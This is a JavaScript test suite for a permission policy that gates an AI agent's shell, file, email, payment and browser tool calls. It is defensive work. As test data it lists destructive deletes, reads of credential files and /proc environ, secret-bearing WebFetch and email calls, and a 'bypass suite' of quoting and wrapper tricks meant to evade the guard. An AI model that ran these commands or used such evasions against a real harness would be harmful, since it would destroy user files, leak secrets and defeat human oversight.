import { test } from 'node:test'
import assert from 'node:assert/strict'
import { homedir } from 'node:os'

import { judge, recipientsOf } from './policy.mjs'

const WS = '/work/t1'
/** Build the default policy context with optional path/contact overrides. */
const ctx = (extra = {}) => ({ workspace: WS, kind: 'code', contacts: new Set(), exists: () => true, ...extra })
/** Judge a shell command under the shared test workspace. */
const bash = (command, extra) => judge('Bash', { command }, ctx(extra))
/** Extract the decision field for concise policy assertions. */
const decision = (v) => v.decision

// Confirms ordinary development commands remain available without approval.
test('ordinary development work is allowed', () => {
  for (const c of [
    'npm test',
    'git status && git add -A && git commit -m "fix"',
    'git push -u origin jarvis/fix-ci',
    'rm -rf node_modules dist/*',
    'mv a.txt b.txt',
    'find . -name "*.log" -delete',
    'git reset --hard HEAD~1',
  ]) assert.equal(decision(bash(c)), 'allow', c)
})

// Protects files outside the task workspace with approval or denial.
test('deleting or moving outside the workspace needs approval', () => {
  assert.equal(decision(bash('rm -rf /home/someone/photos')), 'approval')
  assert.equal(decision(bash('rm -rf ~/projects')), 'approval')
  assert.equal(decision(bash('mv report.md /etc/report.md')), 'approval')
  assert.equal(decision(bash('find /var/log -name "*.gz" -delete')), 'approval')
  assert.equal(bash('rm -rf /tmp/x').category, 'destruction')
  assert.equal(decision(bash('printf data > ~/Projects/app/notes.txt')), 'allow')
  assert.equal(decision(bash('printf data > ~/notes.txt')), 'approval')
  assert.equal(decision(bash('rm -rf ~/Documents')), 'approval')
})

// Ensures shell working-directory changes affect later path checks.
test('a cd before a delete is judged from where the cd lands', () => {
  assert.equal(decision(bash('cd .. && rm -rf t2')), 'approval')
  assert.equal(decision(bash('cd src && rm -rf build')), 'allow')
})

// Requires approval when variables or substitutions hide the target path.
test('a delete through an unresolved variable needs approval', () => {
  assert.equal(decision(bash('rm -rf "$TARGET"')), 'approval')
  assert.equal(decision(bash('rm -rf $(pwd)/x')), 'approval')
})

// Guards shared git refs, remotes, and history against destructive operations.
test('force pushes, remote branch deletes and history rewrites need approval', () => {
  for (const c of [
    'git push --force origin main',
    'git push -f',
    'git push --force-with-lease origin feature',
    'git push origin +main',
    'git push origin --delete old-branch',
    'git push origin :old-branch',
    'git filter-repo --path secrets',
    'git filter-branch --tree-filter x',
  ]) assert.equal(decision(bash(c)), 'approval', c)
})

// Detects database schema/data destruction embedded in shell commands.
test('dropping database objects needs approval', () => {
  assert.equal(decision(bash('psql -c "DROP TABLE users"')), 'approval')
  assert.equal(decision(bash('sqlite3 app.db "drop database x"')), 'approval')
})

// Ensures credential paths are denied regardless of file or shell tool.
test('credential files are denied outright, by tool or by shell', () => {
  assert.equal(decision(judge('Read', { file_path: '~/.ssh/id_rsa' }, ctx())), 'deny')
  assert.equal(decision(judge('Read', { file_path: `${homedir()}/.claude.json` }, ctx())), 'deny')
  assert.equal(decision(judge('Read', { file_path: `${WS}/.env` }, ctx())), 'deny')
  assert.equal(decision(judge('Read', { file_path: `${homedir()}/.config/jarvis/secrets.env` }, ctx())), 'deny')
  assert.equal(decision(bash('cat ~/.ssh/id_ed25519')), 'deny')
  assert.equal(decision(bash('cat $HOME/.ssh/config')), 'deny')
  assert.equal(bash('cat ~/.ssh/id_ed25519').category, 'credentials')
})

// Keeps documented environment templates usable while secrets remain protected.
test('example env files are ordinary files', () => {
  assert.equal(decision(judge('Read', { file_path: `${WS}/.env.example` }, ctx())), 'allow')
})

// Prevents secret-shaped input from reaching any tool or audit detail.
test('secret-shaped values never leave in a tool call', () => {
  const key = 'sk-ant-api03-' + 'a'.repeat(40)
  assert.equal(decision(judge('WebFetch', { url: `https://x.test/?k=${key}` }, ctx())), 'deny')
  assert.equal(decision(judge('mcp__gmail__send_email', { to: 'a@b.c', body: '-----BEGIN OPENSSH PRIVATE KEY-----' }, ctx())), 'deny')
})

// Checks generated output stays task-local while project source edits remain possible.
test('generated files stay in the work folder; only project folders may be edited elsewhere', () => {
  assert.equal(decision(judge('Write', { file_path: `${WS}/notes.md` }, ctx())), 'allow')
  assert.equal(decision(judge('Write', { file_path: `${homedir()}/Projects/app/src/index.mjs` }, ctx())), 'allow')
  assert.notEqual(decision(judge('Write', { file_path: `${homedir()}/Documents/notes.md` }, ctx({ exists: () => false }))), 'allow')
  assert.equal(decision(judge('Write', { file_path: `${homedir()}/Documents/notes.md` }, ctx({ kind: 'research' }))), 'deny')
  assert.equal(decision(judge('Write', { file_path: `${homedir()}/.ssh/authorized_keys` }, ctx())), 'deny')
  assert.equal(decision(judge('Write', { file_path: '/home/x/.bashrc' }, ctx())), 'approval')
  assert.equal(decision(judge('Write', { file_path: '/tmp/new.txt' }, ctx({ exists: () => false }))), 'deny')
  assert.equal(decision(judge('Write', { file_path: '/tmp/new.txt' }, ctx({ kind: 'research', exists: () => false }))), 'deny')
  assert.equal(decision(judge('Write', { file_path: '/tmp/new.txt' }, ctx({ kind: 'marketing', exists: () => false }))), 'deny')
})

// Requires explicit approval for payment and purchase tools but not reads.
test('money-moving tools need approval; reads do not', () => {
  assert.equal(decision(judge('mcp__stripe__create_refund', { charge: 'ch_1' }, ctx())), 'approval')
  assert.equal(decision(judge('mcp__stripe__list_customers', {}, ctx())), 'allow')
  assert.equal(decision(judge('mcp__shop__purchase_item', { sku: 'x' }, ctx())), 'approval')
  assert.equal(judge('mcp__shop__purchase_item', {}, ctx()).category, 'money')
})

// Distinguishes navigation from actions while Chrome is on a checkout page.
test('acting on a payment page in Chrome needs approval; navigating does not', () => {
  assert.equal(decision(judge('mcp__jarvis_chrome__chrome_click', { target: 'Place your order' }, ctx())), 'approval')
  assert.equal(decision(judge('mcp__jarvis_chrome__chrome_navigate', { url: 'https://shop.test/checkout' }, ctx())), 'allow')
  assert.equal(decision(judge('mcp__jarvis_chrome__chrome_click', { target: 'Next page' }, ctx())), 'allow')
})

// Requires approval for unknown recipients while exempting known contacts and drafts.
test('messages to someone new need approval; known contacts and drafts do not', () => {
  const known = ctx({ contacts: new Set(['ann@example.com']) })
  assert.equal(decision(judge('mcp__gmail__send_email', { to: 'Ann <ann@example.com>' }, known)), 'allow')
  const v = judge('mcp__gmail__send_email', { to: 'ann@example.com, bob@example.com' }, known)
  assert.equal(v.decision, 'approval')
  assert.equal(v.category, 'new_contact')
  assert.deepEqual(v.recipients, ['bob@example.com'])
  assert.equal(decision(judge('mcp__gmail__send_email', { body: 'hi' }, known)), 'approval')
  assert.equal(decision(judge('mcp__gmail__create_draft', { to: 'zed@example.com' }, known)), 'allow')
  assert.equal(decision(judge('mcp__db__postgres_query', { sql: 'select 1' }, known)), 'allow')
})

// Covers recipient field parsing, address extraction, and deduplication.
test('recipientsOf reads the usual fields and angle-bracket addresses', () => {
  assert.deepEqual(recipientsOf({ to: ['A <a@x.io>'], cc: 'b@x.io; c@x.io' }), ['a@x.io', 'b@x.io', 'c@x.io'])
})

// Confirms the reporting tool is exempt from ordinary MCP side-effect checks.
test('the report tool is always allowed', () => {
  assert.equal(decision(judge('mcp__agent__report', { status: 'done', summary: 'ok' }, ctx())), 'allow')
})

// ---------------------------------------------------------------------------
// Final-review bypass suite: real input shapes, each an ordinary tool call.

// Exercises credential path detection across providers, quoting, and procfs.
test('F3: credential stores beyond ssh are denied, by any tool and any quoting', () => {
  const H = homedir()
  for (const p of [
    `${H}/.claude/.credentials.json`, `${H}/.git-credentials`, `${H}/.netrc`, `${H}/.aws/credentials`,
    `${H}/.config/gh/hosts.yml`, `${H}/.docker/config.json`, `${H}/.npmrc`, `${WS}/.envrc`,
    '/proc/self/environ', '/proc/1234/environ',
  ]) assert.equal(decision(judge('Read', { file_path: p }, ctx())), 'deny', p)
  assert.equal(decision(bash("cat ~/.s'sh'/id_rsa")), 'deny')
  assert.equal(decision(bash('cat ~/.s\\sh/id_rsa')), 'deny')
  assert.equal(decision(bash('cat /proc/self/environ')), 'deny')
})

// Blocks recursive search from roots that could enumerate private configuration.
test('F3: searching a folder that contains secrets is denied; searching the workspace is not', () => {
  const H = homedir()
  for (const path of [`${H}/.config/jarvis`, `${H}/.config`, H, '/', `${H}/.claude`]) {
    assert.equal(decision(judge('Grep', { pattern: 'KEY', path, output_mode: 'content' }, ctx())), 'deny', path)
    assert.equal(decision(judge('Glob', { pattern: '**/*', path }, ctx())), 'deny', path)
  }
  assert.equal(decision(judge('Grep', { pattern: 'TODO', path: WS }, ctx())), 'allow')
  assert.equal(decision(judge('Grep', { pattern: 'TODO' }, ctx())), 'allow')
})

// Covers shell wrappers, grouping, pipelines, xargs, find, and indirect deletion.
test('F4: everyday shell forms cannot hide a delete outside the workspace', () => {
  for (const c of [
    '/bin/rm -rf ~/Documents',
    '\\rm -rf ~/Documents',
    'bash -c "rm -rf ~/Documents"',
    "sh -c 'rm -rf ~/Documents'",
    'true & rm -rf ~/Documents',
    '(rm -rf ~/Documents)',
    '{ rm -rf ~/Documents; }',
    'if true; then rm -rf ~/Documents; fi',
    'for d in a; do rm -rf ~/Documents; done',
    'echo ~/Documents | xargs rm -rf',
    'find ~/Documents -exec /bin/rm {} +',
    'rsync -a --delete empty/ ~/Documents/',
    'pushd .. && rm -rf x',
    'cd - && rm -rf x',
    'eval "rm -rf ~/Documents"',
    'x=$(rm -rf ~/Documents)',
    'echo `rm -rf ~/Documents`',
  ]) assert.equal(decision(bash(c)), 'approval', c)
  for (const c of ['echo > ~/.bashrc', 'echo hi >> ~/.bashrc', 'cp /dev/null ~/.bashrc', 'sed -i d ~/.bashrc']) {
    assert.equal(decision(bash(c)), 'approval', c)
  }
})

// Guards against false positives on common shell commands and safe redirects.
test('F4: the hardened parser still allows ordinary work', () => {
  for (const c of [
    'npm test 2>&1 | tail -20',
    'echo done > build.log',
    'node script.js > /dev/null 2>&1',
    'bash -c "npm run build"',
    'ls | xargs echo',
    'cp src/a.js src/b.js',
    '(cd src && npm test)',
    'for f in *.md; do echo $f; done',
  ]) assert.equal(decision(bash(c)), 'allow', c)
})

// Checks less common git push spellings that can rewrite or delete remote refs.
test('F4: force flags in clusters, mirror and prune pushes need approval', () => {
  for (const c of ['git push -fu origin main', 'git push -uf origin x', 'git push --mirror', 'git push --prune origin']) {
    assert.equal(decision(bash(c)), 'approval', c)
  }
  assert.equal(decision(bash('git push -u origin jarvis/x')), 'allow')
})

// Ensures writes follow canonical paths rather than trusting symlink names.
test('F4: a Write through a symlink is judged by where it really lands', () => {
  const v = judge('Write', { file_path: `${WS}/link` }, ctx({ realpath: (path) => path === `${WS}/link` ? '/etc/passwd' : path }))
  assert.equal(v.decision, 'approval')
})

// Covers destructive local git operations outside task-owned working changes.
test('F5: git operations on shared refs, stash and reflog need approval', () => {
  for (const c of [
    'git branch -D user-feature', 'git branch -d old', 'git branch --delete old',
    'git update-ref -d refs/heads/main', 'git stash clear', 'git stash drop',
    'git reflog expire --expire=now --all', 'git gc --prune=now',
  ]) assert.equal(decision(bash(c)), 'approval', c)
  assert.equal(decision(bash('git branch -a')), 'allow')
  assert.equal(decision(bash('git stash list')), 'allow')
})

// Verifies MCP names and SQL text trigger money/destruction checks accurately.
test('F6: destructive MCP tools and SQL need approval; checkout is not a read', () => {
  assert.equal(decision(judge('mcp__gdrive__delete_file', { id: 'x' }, ctx())), 'approval')
  assert.equal(decision(judge('mcp__github__delete_repository', { repo: 'x' }, ctx())), 'approval')
  assert.equal(decision(judge('mcp__postgres__query', { sql: 'DROP TABLE users' }, ctx())), 'approval')
  assert.equal(decision(judge('mcp__postgres__query', { sql: 'delete from users' }, ctx())), 'approval')
  assert.equal(decision(judge('mcp__postgres__query', { sql: 'select 1' }, ctx())), 'allow')
  assert.equal(judge('mcp__shop__checkout_cart', {}, ctx()).category, 'money')
  assert.equal(decision(judge('mcp__shop__check_stock', {}, ctx())), 'allow')
})

// Distinguishes sending saved drafts from creating or editing unsent drafts.
test('F6: sending a draft is a send; only creating or editing a draft is exempt', () => {
  const known = ctx({ contacts: new Set(['ann@example.com']) })
  assert.equal(decision(judge('mcp__gmail__send_draft', { draft_id: 'd1' }, known)), 'approval')
  assert.equal(decision(judge('mcp__gmail__create_draft', { to: 'zed@example.com' }, known)), 'allow')
  assert.equal(decision(judge('mcp__gmail__update_draft', { to: 'zed@example.com' }, known)), 'allow')
})

// Applies payment-page approval to click/type/form actions, not page reads.
test('F2: Chrome acting tools need approval while the tab is on a payment page', () => {
  const shop = ctx({ commerce: true })
  assert.equal(decision(judge('mcp__jarvis_chrome__chrome_click', { ref: 'ref_12' }, shop)), 'approval')
  assert.equal(decision(judge('mcp__jarvis_chrome__chrome_key', { text: 'Return' }, shop)), 'approval')
  assert.equal(decision(judge('mcp__jarvis_chrome__chrome_form_input', { ref: 'ref_3', value: 'x' }, shop)), 'approval')
  assert.equal(decision(judge('mcp__jarvis_chrome__chrome_type', { text: 'hello' }, shop)), 'approval')
  assert.equal(decision(judge('mcp__jarvis_chrome__chrome_read_page', {}, shop)), 'allow')
  assert.equal(decision(judge('mcp__jarvis_chrome__chrome_click', { ref: 'ref_12' }, ctx())), 'allow')
  assert.equal(decision(judge('mcp__jarvis_chrome__chrome_type', { text: '4111 1111 1111 1111' }, ctx())), 'approval')
})

// Checks independent URL and content signals used for commerce detection.
test('commerce detection reads URLs and page text', async () => {
  const { looksLikeCheckoutUrl, looksLikeCheckoutPage } = await import('./policy.mjs')
  assert.ok(looksLikeCheckoutUrl('https://shop.test/checkout/step2'))
  assert.ok(looksLikeCheckoutUrl('https://x.test/cart'))
  assert.ok(!looksLikeCheckoutUrl('https://news.test/story'))
  assert.ok(looksLikeCheckoutPage('Order summary ... Place your order'))
  assert.ok(!looksLikeCheckoutPage('A story about ducks'))
})

// Ensures audit text retains context while replacing embedded secrets.
test('F8: redact hides secret-shaped values in audit text', async () => {
  const { redact } = await import('./policy.mjs')
  assert.equal(redact('curl -H "Authorization: Bearer abcdefghijklmnopqrstuvwxyz123456"'), 'curl -H "Authorization: [redacted]"')
})
